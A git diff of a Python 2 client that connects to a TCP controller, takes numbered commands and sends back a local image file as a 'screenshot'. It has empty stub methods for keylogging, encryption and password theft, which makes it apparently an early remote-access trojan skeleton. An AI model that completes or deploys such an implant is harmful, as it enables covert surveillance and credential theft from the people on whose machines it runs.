@@ -2,44 +2,100 @@ import socket
 import signal
 import sys
 import util
+import threading, time
+from Queue import Queue
 
 def signal_handler(signal, frame):
         print('You pressed Ctrl+C!')
-        global s
-        s.close()
-        global f
-        f.close()
         sys.exit(0)
-signal.signal(signal.SIGINT, signal_handler)
 
-f = open('/Users/matt/Desktop/jain8cr.jpg', 'rb')
-fread = f.read()
+class Client:
 
-TCP_IP = 'localhost'
-TCP_PORT = 5715
-BUFFER_SIZE = 1024
+    def __init__(self,ip='localhost',port=5715):
+        self.messageQ = Queue()
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((TCP_IP, TCP_PORT))
-while 1:
-    size = util.getSizeOfCommand(s)
-    print "size: " + str(size)
-    data = s.recv(1024).rstrip()
-    print "data: " + data
-    if not data:
-        break
-    if data == "100":
-        output = "hello"
-    elif data == "143":
-        output = "!" + str(len(fread))
-        util.sendMessage(s,output)
-        output = "!" + fread
-        util.sendMessage(s,output)
-        print "done sending"
-    elif data == "144":
-        output = "other thing"
-    elif data == "145":
-        output = "last thing"
-    else:
-        output = "i don't know that command"
-s.close()
+        TCP_IP = ip
+        TCP_PORT = port
+
+        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.s.connect((TCP_IP, TCP_PORT))
+
+    def run(self):
+
+        threading.Thread(target=self.dequeue).start()
+
+        while True:
+            size = self.getSizeOfCommand()
+            data = self.s.recv(size)
+            if not data:
+                break
+            if data == "100":
+                print "hello"
+            elif data == "143":
+                threading.Thread(target=self.screenshot).start()
+            elif data == "144":
+                print "other thing"
+            elif data == "145":
+                print "last thing"
+            else:
+                print "i don't know that command"
+        self.s.close()
+
+    def getSizeOfCommand(self):
+        sizearray = []
+        size = 1
+        data = self.s.recv(1)
+        if data == "!":
+            data = None
+            while data != "!":
+                data = self.s.recv(size)
+                if data != "!" and data != "\n":
+                    sizearray.append(data)
+        size = 0
+        for i in range(0,len(sizearray)):
+            size += int(sizearray[i]) * pow(10,len(sizearray)-i-1)
+        return size
+
+    def screenshot(self):
+        #TODO: Fill this in
+        f = open('/Users/matt/Desktop/jain8cr.jpg', 'rb')
+        fread = f.read()
+        size = str(len(fread))
+        data = fread
+        self.enqueue(size,data)
+
+    def keylog(self):
+        #TODO: Fill this in
+        return
+
+    def encrypt(self):
+        #TODO: Fill this in
+        return
+
+    def passwords(self):
+        #TODO: Fill this in
+        return
+
+    def enqueue(self,size,data):
+        self.messageQ.put((size,data))
+
+    def dequeue(self):
+        while True:
+            data = self.messageQ.get()
+            print data[0]
+            self.sendMessage(data[0],data[1])
+
+    def sendMessage(self,size,data):
+        self.s.send("!" + str(size) + "!" + data)
+
+
+def main():
+    c = Client()
+    c.run()
+
+if __name__ == '__main__':
+    #signal handlers
+    signal.signal(signal.SIGINT, signal_handler)
+
+    #run the program
+    main()
